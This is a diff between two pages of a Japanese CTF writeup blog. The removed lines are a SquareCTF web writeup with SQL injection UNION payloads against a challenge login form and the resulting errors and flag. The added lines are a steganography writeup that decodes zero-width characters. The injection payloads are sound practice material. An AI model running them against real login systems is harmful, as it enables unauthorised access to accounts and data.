@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <title>SquareCTF 2022 Writeup - CTF フラxxグゲット</title>
+  <title>Digital Overdose 2022 Autumn CTF Writeup - CTF フラxxグゲット</title>
   <meta name="renderer" content="webkit" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 
@@ -16,7 +16,7 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
 
-<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2022.squarectf.com/challenges （最近、ちょくちょくCTFイベントに参加しているんですが、全然解けない事が多いです。。。全体的に難易度あがって" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://digitaloverdose.ractf.cloud/campaign 200点を獲得し、チームとしては244位、個人では314位でした。 チーム順位： 個人順位： とりあえず、記念に一個" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
 
 
 
@@ -26,7 +26,7 @@
 <meta name="generator" content="Hugo 0.74.2 with theme even" />
 
 
-<link rel="canonical" href="https://captureamerica.github.io/writeups/post/squarectf_2022/" />
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/digitaloverdose_ractf_2022/" />
 <link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
@@ -39,23 +39,23 @@
 
 
 
-<meta property="og:title" content="SquareCTF 2022 Writeup" />
-<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2022.squarectf.com/challenges （最近、ちょくちょくCTFイベントに参加しているんですが、全然解けない事が多いです。。。全体的に難易度あがって" />
+<meta property="og:title" content="Digital Overdose 2022 Autumn CTF Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://digitaloverdose.ractf.cloud/campaign 200点を獲得し、チームとしては244位、個人では314位でした。 チーム順位： 個人順位： とりあえず、記念に一個" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/squarectf_2022/" />
-<meta property="article:published_time" content="2022-11-20T15:00:00+09:00" />
-<meta property="article:modified_time" content="2022-11-20T15:00:00+09:00" />
-<meta itemprop="name" content="SquareCTF 2022 Writeup">
-<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2022.squarectf.com/challenges （最近、ちょくちょくCTFイベントに参加しているんですが、全然解けない事が多いです。。。全体的に難易度あがって">
-<meta itemprop="datePublished" content="2022-11-20T15:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2022-11-20T15:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="620">
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/digitaloverdose_ractf_2022/" />
+<meta property="article:published_time" content="2022-11-21T22:00:00+09:00" />
+<meta property="article:modified_time" content="2022-11-21T22:00:00+09:00" />
+<meta itemprop="name" content="Digital Overdose 2022 Autumn CTF Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://digitaloverdose.ractf.cloud/campaign 200点を獲得し、チームとしては244位、個人では314位でした。 チーム順位： 個人順位： とりあえず、記念に一個">
+<meta itemprop="datePublished" content="2022-11-21T22:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2022-11-21T22:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="389">
 
 
 
 <meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="SquareCTF 2022 Writeup"/>
-<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2022.squarectf.com/challenges （最近、ちょくちょくCTFイベントに参加しているんですが、全然解けない事が多いです。。。全体的に難易度あがって"/>
+<meta name="twitter:title" content="Digital Overdose 2022 Autumn CTF Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://digitaloverdose.ractf.cloud/campaign 200点を獲得し、チームとしては244位、個人では314位でした。 チーム順位： 個人順位： とりあえず、記念に一個"/>
 
 <!--[if lte IE 9]>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
@@ -132,10 +132,10 @@
           <article class="post">
     
     <header class="post-header">
-      <h1 class="post-title">SquareCTF 2022 Writeup</h1>
+      <h1 class="post-title">Digital Overdose 2022 Autumn CTF Writeup</h1>
 
       <div class="post-meta">
-        <span class="post-time"> 2022-11-20 </span>
+        <span class="post-time"> 2022-11-21 </span>
         <div class="post-category">
             <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
             </div>
@@ -148,7 +148,7 @@
   <div class="post-toc-content">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#web-alex-hanlon-has-the-flag-50-points">[Web]: Alex Hanlon Has The Flag! (50 points)</a>
+    <li><a href="#stego-its-hidden-100-points">[Stego]: It&rsquo;s hidden (100 points)</a>
       <ul>
         <li><a href="#challenge">Challenge</a></li>
         <li><a href="#solution">Solution</a></li>
@@ -163,92 +163,88 @@
 <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
 <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
 <div class='align-right'>
-<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fsquarectf_2022%2F">
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fdigitaloverdose_ractf_2022%2F">
 <img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
 </a>
 </div>
-<p>URL: <a href="https://2022.squarectf.com/challenges">https://2022.squarectf.com/challenges</a>
+<p>URL: <a href="https://digitaloverdose.ractf.cloud/campaign">https://digitaloverdose.ractf.cloud/campaign</a>
 <br /><br /></p>
-<p>（最近、ちょくちょくCTFイベントに参加しているんですが、全然解けない事が多いです。。。全体的に難易度あがってません？？）</p>
-<br>
-えーっと、50点のチャレンジ2つと、Sanity Checkを1問解いただけです。
-<p>101点を獲得し、最終順位は250位でした。<br /></p>
-<img src="https://captureamerica.github.io/writeups/img/squarectf_2022_score.png" alt="squarectf_2022_score.png">
+<p>200点を獲得し、チームとしては244位、個人では314位でした。</p>
 <p><br><br></p>
-<p>とりあえず、記念に一個だけ、writeupを残しておきます。</p>
-<p><br /><br />
-<br /><br /></p>
-<h2 id="web-alex-hanlon-has-the-flag-50-points">[Web]: Alex Hanlon Has The Flag! (50 points)</h2>
+<p>チーム順位：</p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2022_Score1.png" alt="ractf_2022_Score1.png">
+<p><br><br></p>
+<p>個人順位：</p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2022_Score2.png" alt="ractf_2022_Score2.png">
+<p><br />
+とりあえず、記念に一個だけ、writeupを残しておきます。</p>
+<p><br /><br /></p>
+<h2 id="stego-its-hidden-100-points">[Stego]: It&rsquo;s hidden (100 points)</h2>
 <hr>
 <h3 id="challenge">Challenge</h3>
 <blockquote>
-<p>Alex Hanlon has saved the flag in his account! See if you can figure out his username and then login as him. But just know that it will be impossible to brute force his password.
+<p>It is indeed hidden.
 <br /><br />
-<a href="http://chals.2022.squarectf.com:4102">http://chals.2022.squarectf.com:4102</a></p>
+(Yes, there are no files)</p>
 </blockquote>
-<br>
-<h3 id="solution">Solution</h3>
-<p>UsernameとPasswordが入力できるログインフォームが表示されます。</p>
-<p><br />
-Usernameに<code>alex</code>、PasswordにテキトーなSQLiのパターンを入れたときに、</p>
-<pre>
-Sorry, admin is the wrong user
-</pre>
-<p>というエラーが返ります。<code>admin</code>なんて入力してないのに。。</p>
 <p><br /></p>
-<p>実は、次に出てくるチャレンジ「Going In Blind」のDescriptionに、<code>Ok, the developers got smart, and figured out a way to prevent SQLi in the login page. Plus, they decided the flag shouldn't be hardcoded in the web application anymore. </code> という記載があって、それもヒントになってますね。</p>
-<p>おそらく、内部的に以下のようになっているっぽいです。</p>
+<h3 id="solution">Solution</h3>
+<p>このチャレンジ文の中にはデータが付いていませんが、カテゴリトップのところにあるデータが関係しているのは明らかです。</p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2022_itshidden.png" alt="ractf_2022_itshidden.png">
+<p><br /></p>
+<ol>
+<li>これの白い部分だけをコピペしてテキストファイルとして保存します。</li>
+</ol>
+<p><br /></p>
+<ol start="2">
+<li>次に、xxd コマンドで3バイト毎に区切ります。</li>
+</ol>
 <pre>
-SELECT * FROM user WHERE username = 'admin' and PASSWORD = '$password'
+$ xxd -ps -c 3 aaa.txt
+e2808b
+e2808b
+e2808b
+e2808b
+:
+(snip)
+:
 </pre>
-<p><br /><br />
-ここからはトライ＆エラーです。</p>
-<p>入力値：</p>
+<p><br /></p>
+<ol start="3">
+<li>uniq コマンドで出現回数を数えます。</li>
+</ol>
 <pre>
-' union select 1, schema_name, 3 from information_schema.schemata;-- -
+$ xxd -ps -c 3 aaa.txt | uniq -c
+  68 e2808b
+   1 e29688
+  79 e2808b
+   1 e29688
+  67 e2808b
+   1 e29688
+  84 e2808b
+   1 e29688
+:
+(snip)
+:
 </pre>
-<p>結果：</p>
+<p><br /></p>
+<ol start="4">
+<li>e2808b の出現回数の数だけ取り出します。</li>
+</ol>
 <pre>
-java.sql.SQLException: The used SELECT statements have a different number of columns
+$ xxd -ps -c 3 aaa.txt | uniq -c | grep e2808b | cut -c -5 | tr -d " " | tr "\n" " " ; echo
+68 79 67 84 70 123 85 78 51 88 80 51 67 84 51 68 95 69 77 80 84 121 78 51 83 36 125
+</pre>
+<p><br /></p>
+<ol start="5">
+<li>文字へ変換。</li>
+</ol>
+<pre>
+$ python -c 'print("".join([chr(int(x)) for x in "68 79 67 84 70 123 85 78 51 88 80 51 67 84 51 68 95 69 77 80 84 121 78 51 83 36 125".split()]))'
+DOCTF{UN3XP3CT3D_EMPTyN3S$}
 </pre>
 <p><br /><br /></p>
-<p>入力値：</p>
-<pre>
-' union select schema_name from information_schema.schemata;-- -
-</pre>
-<p>結果：</p>
-<pre>
-Sorry, information_schema is the wrong user
-</pre>
-<p><br /><br /></p>
-<p>入力値：（テーブル名とカラム名は完全なGuessです）</p>
-<pre>
-' union select username from user where id = 1;-- -
-</pre>
-<p>結果：</p>
-<pre>
-java.sql.SQLSyntaxErrorException: Unknown column 'id' in 'where clause'
-</pre>
-<p><br /><br /></p>
-<p>入力値：</p>
-<pre>
-' union select username from user where username like 'al%';-- -
-</pre>
-<p>結果：</p>
-<pre>
-Nope, try again!
-</pre>
-<p><br /><br /></p>
-<p>入力値：</p>
-<pre>
-' union select username from user where username <> 'admin';-- -
-</pre>
-<p>結果：</p>
-<pre>
-flag{470bbbc0519e4bc6987bb00bef24a97a}
-</pre>
-<p><br /><br /></p>
-<p>Flag: <code>flag{470bbbc0519e4bc6987bb00bef24a97a}</code></p>
+<p>Flag: <code>DOCTF{UN3XP3CT3D_EMPTyN3S$}</code></p>
 <p><br /><br />
 <br /><br /></p>
 <hr>
@@ -265,7 +261,7 @@ flag{470bbbc0519e4bc6987bb00bef24a97a}
   <p class="copyright-item">
     <span class="item-title">LastMod</span>
     <span class="item-content">
-        2022-11-20
+        2022-11-21
         
     </span>
   </p>
@@ -277,13 +273,9 @@ flag{470bbbc0519e4bc6987bb00bef24a97a}
           <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
           </div>
       <nav class="post-nav">
-        <a class="prev" href="https://captureamerica.github.io/writeups/post/digitaloverdose_ractf_2022/">
-            <i class="iconfont icon-left"></i>
-            <span class="prev-text nav-default">Digital Overdose 2022 Autumn CTF Writeup</span>
-            <span class="prev-text nav-mobile">Prev</span>
-          </a>
-        <a class="next" href="https://captureamerica.github.io/writeups/post/learnone_completed/">
-            <span class="next-text nav-default">LearnOne (OSCP) completed</span>
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/squarectf_2022/">
+            <span class="next-text nav-default">SquareCTF 2022 Writeup</span>
             <span class="next-text nav-mobile">Next</span>
             <i class="iconfont icon-right"></i>
           </a>
